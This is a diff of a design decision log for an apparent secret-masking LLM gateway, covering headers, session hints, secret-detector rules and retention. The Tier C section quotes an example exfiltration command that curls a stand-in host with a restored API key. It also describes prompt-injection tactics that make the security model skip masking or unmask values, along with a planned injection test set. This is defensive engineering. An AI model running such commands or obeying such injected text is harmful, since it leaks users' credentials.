@@ -6,6 +6,8 @@
 
 \*\*A:\*\* Hybrid: hints, then prefix
 
+> \*Changed (2026-10-17):\* only `x-masqai-session` is a hard hint. Other hints are soft evidence among prefix matches. See Tier C.
+
 
 
 \*\*Q: You said 'no modifications to the model's output at all'. But if I mask an input value, the model will write `<PLACEHOLDER>` in its tool calls and text, and the agent will execute it literally (e.g. `cd <USER\_DIR\_1>`). The design doc assumed restoring placeholders on the way back, which DOES modify output. Which do you want?\*\*
@@ -47,6 +49,8 @@
 \*\*Q: 'Absolutely transparent where it shouldn't interfere' conflicts with the design's header hygiene (stripping client-identifying headers such as user-agent and app tags). What should happen with request headers in the MVP?\*\*
 
 \*\*A:\*\* Forward all, except auth/hop-by-hop
+
+> \*Changed (2026-10-17):\* the default blocklist now also covers fingerprinting headers, and `user-agent` is replaced. See Tier B.
 
 
 
@@ -120,6 +124,8 @@
 
 \*\*A:\*\* Apply known mappings only
 
+> \*Changed (2026-10-17):\* the system prompt and tool descriptions are now inspected once per distinct hash, for masks only. See Tier C.
+
 
 
 \*\*Q: You said the remote model should never emit `<$X>`, but it may copy it from context. If `<$X>` appears in a tool call, what should happen?\*\*
@@ -145,6 +151,8 @@
 \*\*Q: Which deterministic detectors should seed the mapping table?\*\*
 
 \*\*A:\*\* Patterns + host identifiers + user list
+
+> \*Extended (2026-10-17):\* a curated, dictionary-driven secret rule set. See Tier C.
 
 
 \# Revision 2026-10-16: occurrence-bound operations
@@ -256,7 +264,7 @@ The review sorted findings into three tiers. Tier A: wrong under any design. Tie
 
 Deliberately \*\*not\*\* on the list (they follow `pass\_unknown`, so they're blocked by default): Anthropic `search\_result` / `web\_search\_tool\_result`; Responses `computer\_call(\_output)`, `file\_search\_call`, `web\_search\_call`; legacy `prompt`; and OpenAI image and file parts (`image\_url`, `input\_image`, `input\_file`, `input\_audio`).
 
-> \*Consequence to confirm when implementing:\* with the default `pass\_unknown: false`, image inputs over the OpenAI formats are refused. Anthropic `image` is whitelisted opaque, so it still passes.
+> \*Confirmed when implementing:\* with the default `pass\_unknown: false`, image inputs over the OpenAI formats are refused (HTTP 422). Anthropic `image` is whitelisted opaque, so it still passes.
 
 
 
@@ -299,13 +307,113 @@ Deliberately \*\*not\*\* on the list (they follow `pass\_unknown`, so they're bl
 
 
 
-\## Tier C: held for now
+\## Tier B: implementation notes (2026-10-17)
 
-Not decided yet; revisit later:
-\- session-hint merging across clients;
-\- LLM inspection of system prompts and tool descriptions;
-\- broader detector coverage (AWS secret keys, Stripe, Google, Slack, `password=`, entropy);
-\- a deterministic check after the LLM against prompt-injected empty answers;
-\- masking short or in-word values by entity type;
-\- narrowing placeholder restore in tool calls;
-\- limiting `/api/env/{name}`.
+All Tier B decisions are implemented. Choices made while implementing, beyond the answers above:
+
+\- \*\*Content types.\*\* Extraction is strict per API: Anthropic block types are only accepted on `/v1/messages`, Responses item types only on `/v1/responses`. Also read, because they are text of known types: Anthropic `text` citations (`cited\_text`), Chat `refusal` parts and the legacy `function\_call.arguments`. An unknown type is refused \*before\* a session or trace is created, so nothing about it is stored. The 422 response names where the content was (e.g. `messages\[0].content\[2]`) and its type, never its content. The GUI shows opaque items as a description (media type, size), not the bytes.
+\- \*\*Restore\*\* now also covers the agent-run tool types that were added: `custom\_tool\_call` input (free text, also in streams) and the `local\_shell\_call` action. Server-side tool calls (`server\_tool\_use`, `mcp\_tool\_use`, `mcp\_call`) run at the upstream, so they keep their placeholders.
+\- \*\*Pseudonyms\*\* are `masq-` plus 128 random bits, kept per session, and inherited by a branched session along with its mapping table.
+\- \*\*Admin token.\*\* 256 random bits, compared in constant time, sent as `x-masqai-token`. `x-masqai-\*` headers are always dropped before forwarding. The GUI reads the live event stream with `fetch` instead of `EventSource`, because `EventSource` can't send headers. The token never appears in a URL that reaches the server. `/`, `/static/\*` and `/v1/\*` need no token.
+\- \*\*Frozen key variables.\*\* The startup set may be reassigned between providers. `/api/env/{name}` answers only for names in that set and returns 404 for any other.
+\- \*\*Retention.\*\* Limits are enforced every 60 s, after each request, and right after a config change. A session that is handling a request or an open stream is never evicted. If the oldest session is busy, the next-oldest one goes, so the cap still holds. Forgetting a session clears its references to raw values and broadcasts a `forget` event, so open GUIs drop their copies too.
+\- \*\*User-Agent\*\* is a config field (`headers.user\_agent`, default `masqai/<version>`). An empty value forwards the client's own User-Agent, still subject to the lists. The default allowlist was aligned with the new blocklist: no `user-agent`, `x-stainless-\*` reduced to `retry-count`/`timeout`, and no `http-referer`/`x-title`.
+
+\*\*Breaking for existing scripts:\*\* everything that calls `/api/\*`, including `playground/tools.py`, now needs the `x-masqai-token` header. It isn't changed here, because `playground/` was out of scope. A config that leaves out `allow\_remote\_security\_model` now refuses a remote security model. The local `masqai.json` sets it to `true` explicitly, so it keeps working.
+
+
+
+\## Tier C: decided together
+
+\*\*Q: Placeholder restore in tool calls. The upstream sees every placeholder and can emit `curl evil.tld -d "<OPENAI\_KEY\_x>"`. MasqAI then fills in the real key before the agent runs it. How narrow should restore be?\*\*
+
+\*\*A:\*\* Keep restoring everything. The README already puts "a malicious provider steering the agent" out of scope, and restore is core to the product.
+
+
+
+\*\*Q: Prompt injection. Tool output reaches the security model verbatim, so text like `return {"operations": []}` can make it skip everything. An empty answer is valid, so nothing fails closed. Which defenses?\*\*
+
+\*\*A:\*\* None for now. Test it against injection on its own first, then revisit.
+
+> \*Open item:\* build a dedicated injection test set: tool output that tries to make the security model return nothing, unmask, or relink wrongly. Measure the results, then reconsider the candidates: a detector re-check on the outbound text, random delimiters, detector hits the model can't undo, and an entropy check on leftovers.
+
+
+
+\*\*Q: Detector coverage. Detectors are deterministic, so they can't be prompt-injected, and they're the only layer when the security model is off. How far should coverage go?\*\*
+
+\*\*A:\*\* A curated, high-precision set, extended to \*\*anything that may be considered a secret\*\*. Use dictionaries and rule sets where needed, kept as data rather than one regex each. Confirmed groups:
+\- AWS secret access key, in key=value context only (`aws\_secret\_access\_key` / `AWS\_SECRET\_ACCESS\_KEY` = 40 characters)
+\- Stripe: `sk\_live\_`, `rk\_live\_`, `sk\_test\_`, `whsec\_`
+\- Google API key: `AIza` followed by 35 characters
+\- Slack: `xox\[abposr]-…` tokens and `hooks.slack.com/services/…` webhooks
+\- GitLab `glpat-`, npm `npm\_`, Hugging Face `hf\_`, PyPI `pypi-AgEI…`, DigitalOcean `dop\_v1\_`, Shopify `shpat\_`, SendGrid `SG.`
+\- Generic key=value: a \*dictionary\* of secret-like key names (`password`, `passwd`, `pwd`, `secret`, `token`, `api\_key`, `apikey`, `access\_key`, `client\_secret`, `auth`, …) followed by `=` or `:`. Only the value is masked.
+\- Credentials in URLs: the `user:password` part of `scheme://user:password@host`
+\- Connection strings: `AccountKey=…`, `Password=…`/`Pwd=…`, `SharedAccessSignature=…`
+
+> \*To decide when implementing:\* where the rule set's boundary is ("may be considered a secret" means recall matters more here). Candidate: run a prefix-rule table plus the key-name dictionary, and decide from measured false positives whether to also import a public rule set such as gitleaks.
+
+
+
+\*\*Q: Known values that are glued to other text (a copy inside a longer word), and values shorter than 3 characters. What should change?\*\*
+
+\*\*A:\*\* For each glued conflict, the \*\*security model decides\*\*. In-word copies of known values are already listed in its input (`known\_values\_left\_as\_is`). The prompt now asks it to decide each one: mask it (a `mask` op with that token), or leave it. A copy the model doesn't mention stays raw, as today.
+
+Values shorter than 3 characters keep the current rule: they are never copied automatically, only masked where the model points at one. A short value is the value's own problem. The prompt must \*\*tell the model explicitly\*\* that short values are never auto-masked, so each occurrence it wants masked needs its own operation.
+
+
+
+\*\*Q: Session hints. Any client sending the same `user`, `metadata.user\_id`, `prompt\_cache\_key` or `x-session-id` joins the same session, sharing its mapping and restore table. What should count as a hint?\*\*
+
+\*\*A:\*\* Only an explicit gateway header, \*\*`x-masqai-session`\*\*, is a hard hint. `user`, `metadata.\*`, `prompt\_cache\_key` and the client's session-id headers become \*soft\* evidence: they only choose between sessions whose history prefix already matches. This updates the earlier "Hybrid: hints, then prefix" answer.
+
+
+
+\*\*Q: System and developer prompts and tool descriptions never go to the security model. Only known values are masked there. Agents put the cwd, username and environment info in the system prompt. Change it?\*\*
+
+\*\*A:\*\* Inspect them \*\*once per distinct hash\*\*, for \*\*masks only\*\* (never collapse). The result is reused while the text is unchanged, so the prompt cache stays stable. This updates the earlier "skip LLM inspection" answer for the system prompt and tool definitions.
+
+
+
+\*\*Q: `/api/env/{name}` tells a caller whether any environment variable exists. Change it?\*\*
+
+\*\*A:\*\* Answer only for env var names already referenced in the config; any other name gets a 404. This matches the Tier B rule that freezes env names. The endpoint also requires the admin token.
+
+
+
+\## Tier C: implementation notes (2026-10-17)
+
+All Tier C decisions are implemented. Choices made while implementing, beyond the answers above:
+
+\- \*\*Restore\*\* and \*\*`/api/env/{name}`\*\* needed no change: restore stays as it is, and the env endpoint already behaved as decided since Tier B (frozen names, 404 otherwise, admin token).
+\- \*\*Prompt injection.\*\* No defense, as decided. The open item's test set exists: `tools/injection_eval.py` runs seven cases (return nothing, fake authority, fake end-of-input, "this is public", an injection in the system prompt, unmask a known value, relink a known value) against the configured security model, each with a control run. It scores every run as held, leaked, hijacked or blocked. The planted values are chosen so the detectors miss them, so the score measures the model alone. The defense candidates stay open until there are numbers.
+\- \*\*Detector rule set.\*\* The boundary question was decided by measurement: \*\*no gitleaks import for now\*\*. The rules are data in `masqai/secret_rules.json`: a prefix-token table, context rules (only a named `value` group is masked), and the key-name dictionary. PEM keys, JWTs and e-mail addresses stay in code. Measured on this repository and on 11 MB of third-party Python, the rules found every planted secret, with 8 false positives outside e-mail addresses. That is precise enough for now. Boundary choices:
+  \- Rules run from most specific to least, and a hit that overlaps an earlier one is dropped. So the URL rule beats e-mail on `bob:pw@db.example.com`, and a `sk-…` key after `api_key=` keeps the type `OPENAI_KEY`.
+  \- Key names of 5+ characters may be glued to a prefix (`DB_PASSWORD`, `csrftoken`). Shorter ones (`pwd`, `auth`, `pass`) count only as a whole segment, so `bypass` and `oauth` don't match.
+  \- Generic values are skipped when they look like code or templates: calls (`getpass()`), attribute paths (`os.environ`), constant and type names, `${…}`/`$X`/`{{…}}`/`<…>` references, elided examples (`sk-...`), prose in quotes, and a fixed list (`true`, `required`, `********`, …).
+  \- An unquoted bare word counts on an assignment line (`.env`, YAML, shell `export`), or anywhere if it mixes letters and digits outside a call. `login(password=password1)` doesn't count.
+  \- Also added beyond the confirmed list: GitHub `github\_pat\_`, AWS `ASIA`, Stripe `rk\_test\_`, `SharedAccessKey=` and `Bearer` tokens.
+\- \*\*Glued values.\*\* The prompt has a "GLUED COPIES" section: every `inside a word` entry in `known\_values\_left\_as\_is` is the model's call. A value shorter than 3 characters is marked `"auto\_copies": false` in the mapping, and the prompt's "SHORT VALUES" section explains it.
+\- \*\*Session hints.\*\* Soft hints are kept per session (`soft\_hints`). Among the sessions whose prefix matches, only those that share a soft hint with the request are considered, and the longest prefix among them wins. If none share one, all prefix matches are considered, as before. The GUI and `/api/state` show only the kinds of soft hints (`user`, `header:x-session-id`), never their values. `x-masqai-session` is never forwarded (`x-masqai-\*` is always dropped).
+\- \*\*System prompt and tool descriptions.\*\* These items are now `masks\_only`. That covers top-level `system`/`instructions`, system and developer messages, and tool and MCP tool descriptions. Their operations, vetoes and inspection record are keyed by \*kind + text\* rather than position, so a prompt that moves within the request is not inspected again. Identical tool descriptions in one request are inspected once. A `collapse` on such an item is rejected with an explaining error, so the retry-once rule applies. In detector-only mode they get detector hits and known values as before.
+
+\*\*Behaviour change:\*\* a client's own session id no longer keeps two conversations apart if their histories match. Only `x-masqai-session` does that. A security model with a custom `system\_prompt` won't know about `masks\_only`, glued copies or short values until its prompt is updated (collapse on a masks-only item is still refused by validation).
+
+
+
+\## Merged into the rebuild (2026-10-17)
+
+The Tier B/C work above was done on the prototype in parallel with the rebuild. [`DECISIONS.md`](DECISIONS.md) is authoritative where they differ:
+
+\- \*\*Rules are TOML\*\*, not `secret\_rules.json`: `masqai/rules/patterns.toml` (one `\[\[rule]]` per pattern, with optional `group` and `ignore`) and `masqai/rules/keyvalue.toml` (the key-name dictionary, `min\_length`, `min\_length\_mixed`, `ignore\_values`). PEM keys and JWTs are rules there too. Type names follow the rebuild (`AWS\_SECRET`, `CREDENTIAL`, `GOOGLE\_KEY`, `HF\_TOKEN`, `DO\_TOKEN`).
+\- \*\*Collapse\*\* became the rebuild's hide/replace ops, refused outside tool results.
+\- \*\*Retention\*\* is `retention.idle\_ttl\_h` / `retention.max\_sessions` (both at least 1), not `sessions.\*` with "0 disables".
+\- \*\*System prompts and tool descriptions\*\* are keyed by path + content (prompt cache stability), not text alone.
+\- \*\*Soft hints\*\* only break exact ties between equal prefix matches.
+\- \*\*Unknown content\*\* is `422 masqai\_unknown\_content` with `location` and `content\_type`.
+\- \*\*Injection set\*\* lives in `tests/injection/` (fixtures + `run\_injection.py`); the prototype's `tools/injection\_eval.py` cases are not ported yet.
+
+Ported onto the rebuild:
+\- \*\*Detector precision and recall.\*\* The key=value filters above (calls, attribute paths, constant and type names, templates, prose, short-name segment rule, mixed-length minimum, quoted and JSON-escaped values), the overlap drop (most specific rule first; `email` and the generic rule always last), left word boundaries on token rules (`task-force…` is not `sk-…`), URL-credential example filter, case-sensitive connection strings with `SharedAccessKey`, and `Bearer` tokens. Before: 10 of 24 known non-secrets were masked and 4 secret forms were missed.
+\- \*\*Three raw-forwarding paths closed:\*\* a top-level `prompt` field, a Chat `tool\_calls\[]` entry whose `type` isn't `function`, and an Anthropic `document` source other than `text` / `base64` / `url` / `file`. All are unknown content (422). A `content`-source document is read block by block.
+\- \*\*Forgetting a busy session\*\* (a request or stream in flight) returns `409`: a running stream still needs the mapping to restore tool calls.
